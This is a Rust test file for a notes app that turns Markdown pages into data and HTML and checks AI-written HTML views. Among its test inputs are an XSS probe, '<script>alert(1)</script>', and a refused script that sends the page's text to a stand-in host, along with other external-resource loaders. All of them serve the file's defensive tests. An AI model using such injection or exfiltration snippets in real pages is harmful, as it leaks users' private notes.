// SPDX-License-Identifier: Apache-2.0
use super::*;

fn page(id: &str, title: &str, content: &str) -> Page {
    serde_json::from_value(serde_json::json!({
        "id": id,
        "title": title,
        "summary": null,
        "content": content,
        "entity_id": null,
        "space": "Travel",
        "source_memory_ids": [],
        "version": 3,
        "status": "active",
        "created_at": "2026-11-01T08:00:00Z",
        "last_compiled": "2026-11-02T08:00:00Z",
        "last_modified": "2026-11-02T09:30:00Z",
        "sources_updated_count": 0,
        "user_edited": false,
    }))
    .unwrap()
}

const TRIP: &str = "\
---
title: Japan trip
---
Two weeks in Japan, early spring.

## Plan

- [x] Book flights
- [ ] Book the ryokan in Kyoto
- Pack light

| City | Nights |
| --- | --- |
| Tokyo | 5 |
| Kyoto | 4 |

See [[Kyoto notes]] and [[Missing page|a page not written yet]], or [docs](https://example.com/x).

<script>alert(1)</script>

## Sources

- https://example.com/guide

## Budget

Flights cost 900 dollars.

<!-- wenlan:details -->
## Details for AI

Secret instructions for the machine.
";

fn trip_data() -> LookData {
    let targets = look_link_targets([("Kyoto notes", Some("pg_kyoto")), ("Missing page", None)]);
    let mut kyoto = page(
        "pg_kyoto",
        "Kyoto notes",
        "Temples and tea houses.\n\nMore.",
    );
    kyoto.created_at = "2026-11-01T09:00:00Z".into();
    let mut summarized = page("pg_budget", "Budget sheet", "ignored body");
    summarized.summary = Some("What the trip costs, by **week**.".into());
    look_data(
        &page("pg_trip", "Japan trip", TRIP),
        &targets,
        "Travel",
        &[page("pg_trip", "Japan trip", TRIP), kyoto, summarized],
        false,
    )
}

#[test]
fn golden_json_pins_the_wenlan_data_shape() {
    let actual = serde_json::to_value(trip_data()).unwrap();
    let expected: serde_json::Value =
        serde_json::from_str(include_str!("../tests/fixtures/page_look/golden.json")).unwrap();
    assert_eq!(
        actual,
        expected,
        "window.wenlan changed. Within api 1 fields are only added. Actual:\n{}",
        serde_json::to_string_pretty(&actual).unwrap()
    );
}

#[test]
fn the_part_for_people_only() {
    let data = trip_data();
    assert!(!data.page.text.contains("Secret instructions"));
    assert!(!data.page.html.contains("Secret instructions"));
    assert!(
        !data.page.text.contains("example.com/guide"),
        "Sources left out"
    );
    assert!(data.page.sections.iter().all(|s| s.heading != "Sources"));
    assert!(data
        .page
        .sections
        .iter()
        .all(|s| s.heading != "Details for AI"));
}

#[test]
fn raw_html_is_dropped_and_links_become_text() {
    let data = trip_data();
    assert!(!data.page.html.contains("<script"));
    assert!(!data.page.html.contains("alert(1)"), "no raw HTML survives");
    assert!(
        !data.page.html.contains("href="),
        "an external link keeps its text only"
    );
    assert!(data.page.html.contains("docs"));
}

#[test]
fn a_wikilink_to_a_page_is_an_anchor_and_a_missing_one_is_text() {
    let data = trip_data();
    assert!(data
        .page
        .html
        .contains("<a data-wenlan-page=\"pg_kyoto\">Kyoto notes</a>"));
    assert!(data.page.html.contains("a page not written yet"));
    assert!(!data.page.html.contains("[["));
    assert_eq!(
        data.page.links,
        vec![
            LookLink {
                title: "Kyoto notes".into(),
                id: Some("pg_kyoto".into())
            },
            LookLink {
                title: "Missing page".into(),
                id: None
            },
        ]
    );
}

#[test]
fn items_and_tables_sit_under_their_section() {
    let data = trip_data();
    let plan = data
        .page
        .sections
        .iter()
        .find(|s| s.heading == "Plan")
        .unwrap();
    assert_eq!(
        plan.items,
        vec![
            LookItem {
                text: "Book flights".into(),
                done: Some(true)
            },
            LookItem {
                text: "Book the ryokan in Kyoto".into(),
                done: Some(false)
            },
            LookItem {
                text: "Pack light".into(),
                done: None
            },
        ]
    );
    assert_eq!(plan.tables.len(), 1);
    assert_eq!(plan.tables[0].columns, vec!["City", "Nights"]);
    assert_eq!(
        plan.tables[0].rows,
        vec![vec!["Tokyo", "5"], vec!["Kyoto", "4"]]
    );
}

#[test]
fn arrays_are_never_null() {
    let empty = look_data(&page("p", "Empty", ""), &LinkTargets::new(), "", &[], false);
    let json = serde_json::to_value(&empty).unwrap();
    assert_eq!(json["page"]["sections"], serde_json::json!([]));
    assert_eq!(json["page"]["links"], serde_json::json!([]));
    assert_eq!(json["space"]["pages"], serde_json::json!([]));
    let plain = look_data(
        &page("p", "Plain", "Just a sentence."),
        &LinkTargets::new(),
        "",
        &[],
        false,
    );
    let json = serde_json::to_value(&plain).unwrap();
    assert_eq!(json["page"]["sections"][0]["items"], serde_json::json!([]));
    assert_eq!(json["page"]["sections"][0]["tables"], serde_json::json!([]));
}

#[test]
fn space_pages_are_capped_and_say_when_there_are_more() {
    let pages: Vec<Page> = (0..205).map(|i| page(&format!("p{i}"), "T", "x")).collect();
    let data = look_data(&pages[0], &LinkTargets::new(), "S", &pages, false);
    assert_eq!(data.space.pages.len(), LOOK_SPACE_PAGES_MAX);
    assert!(data.space.more);
    let few = look_data(&pages[0], &LinkTargets::new(), "S", &pages[..3], false);
    assert!(!few.space.more);
    let told = look_data(&pages[0], &LinkTargets::new(), "S", &pages[..3], true);
    assert!(told.space.more);
}

#[test]
fn code_in_a_fence_is_kept_escaped_and_never_read_as_a_link() {
    let body = "```js\nconst a = [[1,2],[3,4]]; if (a < b) {}\n```\n";
    let data = look_data(
        &page("p", "Code", body),
        &LinkTargets::new(),
        "",
        &[],
        false,
    );
    assert!(data.page.html.contains("[[1,2],[3,4]]"));
    assert!(data.page.html.contains("a &lt; b"));
    assert!(data.page.links.is_empty());
}

// ---- check_look ----

const PAGE_TEXT: &str = "The first long sentence about the trip itself. \
The second long sentence about the hotel booking. \
The third long sentence about the train passes. \
Short one.";

#[test]
fn a_look_that_reads_the_page_is_kept() {
    let html = "<h1 id=t></h1><script>document.getElementById('t').textContent = wenlan.page.title</script>";
    assert_eq!(check_look(html, PAGE_TEXT), Ok(()));
}

#[test]
fn external_resources_are_refused_with_a_reason() {
    for html in [
        "<img src=\"https://x.test/a.png\">",
        "<img src='//x.test/a.png'>",
        "<link rel=stylesheet href=\"http://x.test/a.css\">",
        "<link rel=preconnect href=https://x.test>",
        "<a href=\"HTTPS://X.test\">x</a>",
        "<script src=\"app.js\"></script>",
        "<style>@import url(https://x.test/a.css);</style>",
        "<style>@import \"//x.test/a.css\";</style>",
        "<style>body{background:url( 'https://x.test/a.png')}</style>",
        "<style>body{background:url(//x.test/a.png)}</style>",
        "<base href=\"/\">",
        "<img srcset=\"a.png 1x, https://x.test/b.png 2x\">",
        "<meta http-equiv=\"refresh\" content=\"0;url=https://x.test\">",
        "<script>a.href = \"https://x.test/?\"+wenlan.page.text</script>",
    ] {
        let reason = check_look(html, PAGE_TEXT).expect_err(html);
        assert!(!reason.is_empty(), "{html}");
        assert!(reason.contains('.'), "plain sentences: {reason}");
        // The MCP passes at most 500 characters of a refusal on to the AI.
        assert!(
            reason.len() + "look_refused: ".len() <= 480,
            "{} chars: {reason}",
            reason.len()
        );
    }
}

#[test]
fn data_urls_and_inline_things_are_fine() {
    let html = "<img src=\"data:image/png;base64,AAAA\"><style>body{background:url(data:image/svg+xml;utf8,<svg/>)}</style><a data-wenlan-page=\"x\">x</a>";
    assert_eq!(check_look(html, PAGE_TEXT), Ok(()));
}

#[test]
fn copying_three_sentences_is_refused() {
    let html = "<p>The first long sentence about the trip itself.</p>\
                <p>The second long sentence about the hotel booking.</p>\
                <p>The third   long sentence\nabout the train passes.</p>";
    let reason = check_look(html, PAGE_TEXT).unwrap_err();
    assert!(
        reason.contains("use wenlan.page instead of copying text"),
        "{reason}"
    );
    assert!(
        reason.len() + "look_refused: ".len() <= 480,
        "{} chars",
        reason.len()
    );
}

#[test]
fn copying_two_sentences_or_short_ones_is_allowed() {
    let two = "<p>The first long sentence about the trip itself.</p><p>The second long sentence about the hotel booking.</p>";
    assert_eq!(check_look(two, PAGE_TEXT), Ok(()));
    let short = "<p>Short one.</p>";
    assert_eq!(check_look(short, "Short one. Tiny. Brief. Wee."), Ok(()));
}

#[test]
fn copying_escaped_text_is_still_copying() {
    let text = "Alpha beta gamma delta epsilon & more. Second sentence is long enough here. Third sentence is also long enough.";
    let html = "<p>Alpha beta gamma delta epsilon &amp; more.</p><p>Second sentence is long enough here.</p><p>Third sentence is also long enough.</p>";
    assert!(check_look(html, text).is_err());
}

#[test]
fn chinese_sentences_count_too() {
    let text = "這是第一句很長的中文句子用來測試重複內容。這是第二句也很長的中文句子用來測試重複內容。這是第三句還是很長的中文句子用來測試重複內容。";
    assert!(check_look(&format!("<p>{text}</p>"), text).is_err());
}

#[test]
fn empty_and_huge_looks_are_refused() {
    assert!(check_look("  ", "x").is_err());
    let huge = "a".repeat(LOOK_MAX_BYTES + 1);
    assert!(check_look(&huge, "x").unwrap_err().contains("limit"));
}

#[test]
fn ux_look_8_pictures_in_the_pages_folder_are_listed_once_and_placed() {
    let content = "\
Intro ![The view](_attachments/view.png) here.

## Day one

![[shot.png|240]] and ![[map.jpg|Old town map]] and ![[notes.pdf]].

![The view again](_attachments/view.png)

![Logo](https://example.com/logo.png) ![](data:image/png;base64,AAAA)
";
    let data = look_data(
        &page("pg_pics", "Pictures", content),
        &LinkTargets::new(),
        "",
        &[],
        false,
    );
    assert_eq!(
        data.page.images,
        vec![
            LookImage {
                src: "_attachments/view.png".into(),
                alt: "The view".into()
            },
            LookImage {
                src: "shot.png".into(),
                alt: "shot.png".into()
            },
            LookImage {
                src: "map.jpg".into(),
                alt: "Old town map".into()
            },
        ]
    );
    let html = &data.page.html;
    assert!(html.contains("Intro <img data-wenlan-image=\"0\" alt=\"The view\"> here."));
    assert!(html.contains("<img data-wenlan-image=\"1\" alt=\"shot.png\"> and <img data-wenlan-image=\"2\" alt=\"Old town map\">"));
    assert!(
        html.contains("![[notes.pdf]]"),
        "a file that is not a picture stays as written"
    );
    assert!(
        html.contains("<img data-wenlan-image=\"0\" alt=\"The view again\">"),
        "the same file keeps its place"
    );
    assert!(
        html.contains("Logo"),
        "a picture on the web keeps its alt text"
    );
    assert!(!html.contains("example.com"));
    assert!(!html.contains("data:image"));
    let day = data
        .page
        .sections
        .iter()
        .find(|s| s.heading == "Day one")
        .unwrap();
    assert!(
        day.html.contains("<img data-wenlan-image=\"1\""),
        "a section names the page's places"
    );
}
